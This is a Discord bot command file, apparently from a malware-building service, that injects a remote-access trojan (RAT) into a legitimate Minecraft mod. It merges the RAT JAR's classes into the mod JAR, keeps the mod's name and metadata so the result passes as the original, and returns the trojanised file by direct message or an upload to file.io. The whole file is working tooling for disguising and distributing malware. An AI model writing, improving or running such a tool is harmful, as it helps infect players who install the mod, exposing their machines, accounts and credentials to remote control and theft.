import { SlashCommandBuilder, AttachmentBuilder, EmbedBuilder } from "discord.js";
import request from "request";
import * as fs from "fs";
import AdmZip from "adm-zip";

export const cooldown = 60;
export const tier = [2, 3];
export const data = new SlashCommandBuilder()
  .setName("inject")
  .setDescription("Inject a mod with a RAT.")
  .addAttachmentOption((option) => option.setName("mod").setDescription("The mod to inject").setRequired(true))
  .addAttachmentOption((option) =>
    option.setName("rat").setDescription("The rat to inject the mod with").setRequired(true)
  )
  .setDMPermission(false);

export async function execute(client, interaction) {
  if (interaction.channel.id != client.config.building) {
    return client.sendErrorEmbed(interaction, `You can only build/use RAT commands in <#${client.config.building}>!`);
  }
  if (client.isInjecting) {
    await client.sendErrorEmbed(interaction, "Another JAR is already being injected!");
    return;
  }
  client.isInjecting = true;

  const modAttachment = interaction.options.getAttachment("mod");
  const ratAttachment = interaction.options.getAttachment("rat");
  const modFile = `MOD-${interaction.channel.id}.jar`;
  const ratFile = `RAT-${interaction.channel.id}.jar`;

  console.log("MOD: " + modAttachment.name);
  console.log("RAT: " + ratAttachment.name);

  if (!ratAttachment.name.endsWith(".jar") || !modAttachment.name.endsWith(".jar")) {
    client.isInjecting = false;
    await client.sendErrorEmbed(interaction, "Invalid Attachments. Both of your files have to be JAR files.");
    return;
  }
  const embed1 = new EmbedBuilder()
    .setColor("Green")
    .setTitle("Please wait")
    .setDescription(
      "✅ Your mod is being injected. Please wait up to 1 minute...\n\nStatus: Downloading both JARs...\n0% [====================================]"
    );
  await interaction.reply({ ephemeral: true, embeds: [embed1] });

  try {
    await saveFile(client, ratAttachment, ratFile);
    await saveFile(client, modAttachment, modFile);
    const embed2 = new EmbedBuilder()
      .setColor("Green")
      .setTitle("Please wait")
      .setDescription(
        "✅ Your mod is being injected. Please wait up to 1 minute...\n\nStatus: Injecting...\n50% [**==================**==================]"
      );
    await interaction.editReply({ embeds: [embed2] });

    // Modify the MOD JAR with RAT contents
    const modifyJar = () => {
      return new Promise(async (resolve, reject) => {
        try {
          const jar = new AdmZip(modFile);
          const rat = new AdmZip(ratFile);
          rat.getEntries().forEach((entry) => {
            const filePath = entry.entryName;
            if (filePath != "mcmod.info" && filePath != "META-INF/MANIFEST.MF" && filePath != "META-INF/") {
              const content = rat.readFile(filePath);
              jar.addFile(filePath, content, "");
            }
          });

          jar.writeZip();

          return resolve();
        } catch (error) {
          await client.logError(error);
          return reject(error);
        }
      });
    };

    await modifyJar();

    const fileSize = fs.statSync(modFile).size / 1000;
    if (fileSize > 7500) {
      const embed3 = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Please wait")
        .setDescription(
          "✅ Your mod is being injected. Please wait up to 1 minute...\n\nStatus: Uploading...\n75% [**===========================**=========]"
        );
      await interaction.editReply({ embeds: [embed3] });

      // Upload to an alternative host
      request.post(
        {
          url: "https://file.io",
          formData: {
            files: {
              value: fs.createReadStream(modFile),
              options: {
                filename: modAttachment.name,
              },
            },
          },
        },
        async (err, httpResponse, body) => {
          if (err) {
            return client.logError(err);
          }

          const response = JSON.parse(body);
          const fileEmbed = new EmbedBuilder()
            .setColor("Green")
            .setTitle("Success")
            .setDescription("✅ File successfully uploaded. Download it from " + response.link);
          const embed4 = new EmbedBuilder()
            .setColor("Green")
            .setTitle("Please wait")
            .setDescription(
              "✅ Your mod is being injected. Please wait up to 1 minute...\n\nStatus: Completed...\n100% [**====================================**]"
            );
          const successEmbed = new EmbedBuilder()
            .setColor(client.config.colors.commands.inject)
            .setTitle("Success! 🎉")
            .setDescription(`Your mod has been injected with a RAT successfully.`)
            .addFields({
              name: "A file has been sent to your direct messages!",
              value: "If you did not receive one, make sure you can receive DMs from members in this server.",
              inline: false,
            });
          try {
            await interaction.member.user.send({ embeds: [fileEmbed] });
          } catch (error) {}
          await interaction.editReply({ embeds: [embed4] });
          await interaction.channel.send({ content: `<@${interaction.member.id}>`, embeds: [successEmbed] });

          const logEmbed = new EmbedBuilder()
            .setColor(client.config.colors.logs.inject)
            .setTitle("RAT Injecting")
            .setDescription(
              `<@${interaction.member.id}> has injected a RAT in his mod called **${modAttachment.name}**. The injected mod is: ${response.link}`
            );
          try {
            const channel = await interaction.guild.channels.fetch(client.config.logs);
            await channel.send({ embeds: [logEmbed] });
          } catch (error) {}

          // Clean up files
          fs.unlinkSync(modFile);
          fs.unlinkSync(ratFile);
        }
      );
    } else {
      // Send the modified MOD JAR file back to Discord
      const jar = new AttachmentBuilder(modFile).setName(modAttachment.name);
      const embed4 = new EmbedBuilder()
        .setColor("Green")
        .setTitle("Please wait")
        .setDescription(
          "✅ Your mod is being injected. Please wait up to 1 minute...\n\nStatus: Completed...\n100% [**====================================**]"
        );
      const successEmbed = new EmbedBuilder()
        .setColor(client.config.colors.commands.inject)
        .setTitle("Success! 🎉")
        .setDescription(`Your mod has been injected with a RAT successfully.`)
        .addFields({
          name: "A file has been sent to your direct messages!",
          value: "If you did not receive one, make sure you can receive DMs from members in this server.",
          inline: false,
        });
      try {
        await interaction.member.user.send({ files: [jar] });
      } catch (error) {}
      await interaction.editReply({ embeds: [embed4] });
      await interaction.channel.send({ content: `<@${interaction.member.id}>`, embeds: [successEmbed] });

      const logEmbed = new EmbedBuilder()
        .setColor(client.config.colors.logs.inject)
        .setTitle("RAT Injecting")
        .setDescription(
          `<@${interaction.member.id}> has injected a RAT in his mod called **${modAttachment.name}**. The injected mod is provided as file.`
        );
      try {
        const channel = await interaction.guild.channels.fetch(client.config.logs);
        await channel.send({ files: [jar], embeds: [logEmbed] });
      } catch (error) {}

      // Clean up files
      fs.unlinkSync(modFile);
      fs.unlinkSync(ratFile);
    }
    client.isInjecting = false;
  } catch (err) {
    client.isInjecting = false;
    client.logError(err);
    await client.sendErrorEmbed(interaction, "Something went wrong. Please contact an administrator.");
  }
}

const saveFile = async (client, attachment, fileName) => {
  return new Promise((resolve, reject) => {
    const fileStream = fs.createWriteStream(fileName);
    const stream = request(attachment.url)
      .on("error", (err) => client.logError(err))
      .pipe(fileStream);
    stream.on("finish", () => {
      resolve();
    });
    stream.on("error", (err) => {
      client.logError(err);
      reject(err);
    });
  });
};
